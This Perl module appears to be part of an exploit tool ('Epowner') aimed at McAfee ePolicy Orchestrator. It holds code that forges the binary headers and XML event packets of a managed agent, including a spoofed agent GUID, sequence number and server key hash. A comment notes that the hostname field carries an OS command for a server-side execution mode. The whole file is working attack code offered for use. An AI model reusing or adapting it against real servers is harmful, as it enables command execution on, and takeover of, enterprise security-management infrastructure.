package Epowner::Epo;

use Crypt::OpenSSL::DSA;
use MIME::Base64;
use Digest::SHA qw(sha1 sha1_hex);

use strict;
use warnings;


#============================================================#
# Event request : Header1                                    #
#============================================================#
sub build_struct_event_header1{

	my $this = shift;

        print "      [+] Building binary header 1\n" if $this->{verbose};

        $this->{binary_header1} =
                "\x50\x4f" .
                # packet type
                "\x01\x00\x00\x60" .
                # header len (binary_header1 + binary_header2)
                "WWWW" .
                "\x01\x00\x00\x00\x00\x00\x00\x00" .
                # data_len
                "ZZZZ" .
                # GUID
                $this->{agent_guid} .
                # unknown
                "\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00" .
                # hostname
                $this->{agent_hostname} .
                # hostname padding
                "\x00" x (32 - length($this->{agent_hostname})) .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" ;

} 


#============================================================#
# Event Request : Header2                                    #
#============================================================#
sub build_struct_event_header2{

	my $this = shift;

        print "      [+] Building binary header 2\n" if $this->{verbose};

	# Generate transaction ID
        my $transaction_guid = generate_guid();

	# increment Sequence number
	$this->{agent_seqnum}++;
	$this->config_save_seqnum_only();


	# build
        $this->{binary_header2} =
                "\x0c\x00\x00\x00" . "ComputerName" .           pack("V", length($this->{agent_hostname})) . $this->{agent_hostname} .
                "\x19\x00\x00\x00" . "GuidRegenerationSupported" . pack("V", length("1")) . "1" .
                "\x0b\x00\x00\x00" . "PackageType" .            pack("V", length("Event")) ."Event" .
                "\x0e\x00\x00\x00" . "SequenceNumber" .         pack("V", length($this->{agent_seqnum})) . $this->{agent_seqnum} .
                "\x0d\x00\x00\x00" . "ServerKeyHash" .          pack("V", length($this->{server_pubkeyhash})) .$this->{server_pubkeyhash} .
                "\x0f\x00\x00\x00" . "SiteinfoVersion" .        pack("V", length("10")) . "10" .
                "\x15\x00\x00\x00" . "SupportedSPIPEVersion" .  pack("V", length("3.0;4.0;5.0;6.0")) . "3.0;4.0;5.0;6.0".
                "\x0f\x00\x00\x00" . "TransactionGUID" .        pack("V", length($transaction_guid)) . $transaction_guid ;

} 



#============================================================#
# Event request : Event part                                 #
#============================================================#
sub build_struct_event_event {

	my $this 	= shift;
	my $hostname 	= shift || $this->{agent_hostname};  	# hostname can be used during --srv-exec, to pass the os command. 
							     	# Max length: 266 chars
	my $filename    = shift || "20121210121340871913800000D61.xml";
	my $filename_len = pack("v", length($filename));	# length of file name in WORD

	my $xml_content = shift || << "EOF";
<?xml version="1.0" encoding="UTF-8"?>
<UpdateEvents>

    <MachineInfo>
        <MachineName><![CDATA[$hostname]]></MachineName>
        <AgentGUID>$this->{agent_guid}</AgentGUID>
        <IPAddress>$this->{agent_ip}</IPAddress>
        <OSName>WXPW</OSName>
        <UserName>user</UserName>
        <TimeZoneBias>-60</TimeZoneBias>
        <RawMACAddress>$this->{agent_mac}</RawMACAddress>
    </MachineInfo>
    <McAfeeCommonUpdater ProductName="McAfee AutoUpdate" ProductVersion="4.5.0" ProductFamily="TVD">
        <UpdateEvent>
            <EventID>2412</EventID>
            <Severity>0</Severity>
            <GMTTime>2012-12-10T11:14:31</GMTTime>
            <ProductID>EPOAGENT3000</ProductID>
            <Locale>080c</Locale>
            <Type>N/A</Type>
            <Error>26</Error>
            <Version>N/A</Version>
            <DateTime>N/A</DateTime>
            <InitiatorID>EPOAGENT3000</InitiatorID>
            <InitiatorType>DeploymentTask</InitiatorType>
        </UpdateEvent>
    </McAfeeCommonUpdater>
</UpdateEvents>
EOF
        print "      [+] Building Event XML content\n" if $this->{verbose};

	$this->{event_xml} = $xml_content;
        
	print "      [+] Packing XML\n" if $this->{verbose};
        $this->{event_xml} =
                "\x01\x00" .				# tag
		$filename_len .				# len of filename   
                $filename .				# filename
                pack("V",length($this->{event_xml})) .  # len of XML
                $this->{event_xml};			# XML content

} 



1;
